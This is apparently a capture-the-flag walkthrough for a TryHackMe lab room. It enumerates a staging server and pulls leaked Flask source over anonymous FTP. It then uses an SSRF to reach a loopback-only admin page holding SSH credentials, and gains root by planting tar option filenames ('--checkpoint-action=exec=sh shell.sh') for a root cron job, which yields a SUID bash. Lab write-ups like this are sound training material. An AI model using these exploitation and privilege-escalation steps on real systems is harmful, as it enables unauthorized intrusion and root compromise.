# [Operation Coldstart](https://tryhackme.com/room/operationcoldstart)

## Wake up the staging server everyone left behind.

# Operation Coldstart

Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

### What is the content of user.txt?

1. Enumerate the target with Nmap

Start with a full TCP port sweep, plus service/version detection and default scripts, so nothing is missed:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.132.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 11:dd:58:14:25:9d:ab:a0:9e:41:37:e2:9e:f3:1f:3d (ECDSA)
|_  256 e7:f3:ad:b1:48:96:32:85:66:6b:04:6b:7c:b2:3c:71 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: URL Preview - Volt Labs
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Pull down whatever anonymous FTP is hiding

Log in anonymously and grab anything sitting in the public share:

```bash
ftp <TARGET_IP>
anonymous
ls -la
cd pub
get backup.tar.gz
```

3. Review the leaked source code

Inside the backup there are three files: `app.py`, `README.md`, `requirements.txt`.

**README.md**

```md
# Volt Labs URL Preview

Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.

Admin routes are gated by source-IP check (localhost only).
```

**requirements.txt:**

```
flask
requests
gunicorn
```

**app.py**

```py
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}

CSS = """
<style>
:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
a{color:var(--primary);text-decoration:none}
a:hover{text-decoration:underline}
.navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.navbar .brand{font-weight:600;font-size:1.125rem;letter-spacing:.2px}
.navbar .muted-light{color:#a5acb3;font-size:.95rem}
.container{max-width:960px;margin:2rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--border);border-radius:.5rem;padding:1.5rem;margin-bottom:1.25rem;box-shadow:0 1px 2px rgba(0,0,0,.04)}
h1{font-size:1.75rem;margin:0 0 .75rem}
h2{font-size:1.25rem;margin:1.25rem 0 .5rem}
.muted{color:var(--muted);font-size:.95rem}
.form-group{margin-bottom:1rem}
label{display:block;margin-bottom:.25rem;font-weight:500;font-size:.95rem}
.form-control{display:block;width:100%;padding:.5rem .75rem;font-size:1rem;line-height:1.5;color:var(--text);background:#fff;border:1px solid var(--border);border-radius:.375rem;transition:border-color .15s,box-shadow .15s}
.form-control:focus{outline:0;border-color:#86b7fe;box-shadow:0 0 0 .2rem rgba(13,110,253,.25)}
.btn{display:inline-block;padding:.5rem 1rem;font-size:1rem;font-weight:500;border:1px solid transparent;border-radius:.375rem;cursor:pointer;transition:background .15s}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:#0b5ed7}
pre{background:#f1f3f5;border:1px solid var(--border);border-radius:.375rem;padding:.75rem;overflow:auto;font-size:.9rem;white-space:pre-wrap;word-break:break-word}
footer.site{text-align:center;color:var(--muted);margin:2rem 0;font-size:.875rem}
</style>
"""

def page(title, body):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title} - Volt Labs</title>{CSS}</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">{body}</main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>"""

@app.route("/")
def index():
    body = """
    <div class="card">
        <h1>URL Preview Service</h1>
        <p class="muted">Internal tool. Paste a URL below to preview its contents.</p>
        <form method="get" action="/preview">
            <div class="form-group">
                <label for="url">URL</label>
                <input id="url" type="text" name="url" class="form-control" placeholder="https://example.com/" required>
            </div>
            <button type="submit" class="btn btn-primary">Preview</button>
        </form>
    </div>
    """
    return page("URL Preview", body)

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    if not target:
        return page("Preview Error",
                    '<div class="card"><p>Provide a <code>?url=</code> parameter.</p></div>'), 400

    # VULN: hostname allow-list is the only check. No scheme check, no path check,
    # no localhost-rebind protection - the SSRF is still abusable, but only
    # against the allowed hostname.
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked",
                    '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

    try:
        r = requests.get(target, timeout=3)
        safe_target = html.escape(target)
        safe_body = r.text.replace("<", "&lt;")
        body = f"""
        <div class="card">
            <h2>Preview of {safe_target}</h2>
            <pre>{safe_body}</pre>
        </div>
        """
        return page("Preview", body)
    except Exception as e:
        safe_err = html.escape(str(e))
        return page("Preview Failed",
                    f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

- The `/admin/notes` route only trusts `request.remote_addr`. It considers a request "local" if the source IP starts with `127.`. This is fine for direct browser access, but Gunicorn is serving the app itself. There's no reverse proxy stripping/rewriting headers, so the only way to actually make `request.remote_addr` equal `127.0.0.1` is for the _Flask process itself_ to originate the request. That's exactly what `/preview` does with the `requests` library.
- `/preview` restricts the destination to a hostname allow-list, but the comment gives away the key detail: **`kestrel.thm` resolves to `127.0.0.1` via a local `/etc/hosts` entry on the box itself**. So from the outside we can't reach `kestrel.thm` at all, but the server can, because its own `/etc/hosts` maps it to loopback.
- This means `/preview?url=http://kestrel.thm/admin/notes` causes the Flask server to make an HTTP request to itself, using loopback as the source address, which satisfies the `remote_addr.startswith("127.")` check on `/admin/notes` and returns its normally-restricted contents through the SSRF.
- The response is reflected back to us, letting us read `/opt/voltlabs-preview/admin_notes.txt` indirectly.

4. Exploit the SSRF to read the admin notes

Browse to `http://<TARGET_IP>/` and use the preview form with: `http://kestrel.thm/admin/notes`

**Results:**

```
<pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
</pre>
```

5. Authenticate over SSH with the leaked credentials

```bash
ssh webdev@<TARGET_IP>
# V0ltLabs#summer
```

6. Read the user flag

```bash
cat user.txt
```

<img width="666" height="549" alt="SCREEN01" src="https://github.com/user-attachments/assets/2284378f-18ae-4a08-9e3a-7940a847a7e9" />

---

### What is the content of flag.txt?

1. Look for privilege-escalation vectors: root-owned cron jobs

A quick way to hunt for scheduled task misconfigurations is to check /`etc/cron.d/`, `/etc/crontab`, and `/var/spool/cron/`:

```bash
cat /etc/cron.d/voltlabs-backup
```

**Results:**

```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

- This job runs **every minute, as root**, and archives everything in `/opt/backups` using a **bare wildcard** instead of a fixed path or explicit filename.
- When a shell expands `*`, `tar` doesn't see a wildcard at all. It sees a literal list of filenames passed as arguments. If `webdev` can write files into /`opt/backups`, we can create filenames that `tar` will interpret as _command-line options_ rather than as archive members.
- `tar` supports a `--checkpoint` / `--checkpoint-action=exec=<command>` pair of flags that run an arbitrary command partway through the archiving process. If we can get filenames like `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` into the directory being archived, `tar` will treat them as options and execute our script as root, since the cron job runs as root.

2. Plant the malicious "filenames" and payload script

```bash
cd /opt/backups
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
echo -e '#!/bin/bash \ncp /bin/bash /home/webdev\nchmod +s /home/webdev/bash' > shell.sh
```

Wait one minute for the cron job to fire. When it does, `tar` expands `/opt/backups/*` into its argument list, encounters our two specially-named files, treats them as `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`, and as root runs `sh shell.sh`. That script copies `/bin/bash` into `webdev`'s home directory and sets the **setuid bit**, producing a root-owned, SUID `bash` binary.

Then spawn a privileged shell using the `-p` flag:

```bash
/home/webdev/bash -p
```

3. Read the root flag

```bash
cat /root/flag.txt
```

<img width="994" height="395" alt="SCREEN02" src="https://github.com/user-attachments/assets/c5867772-9d00-49e3-839b-805a0009d39f" />
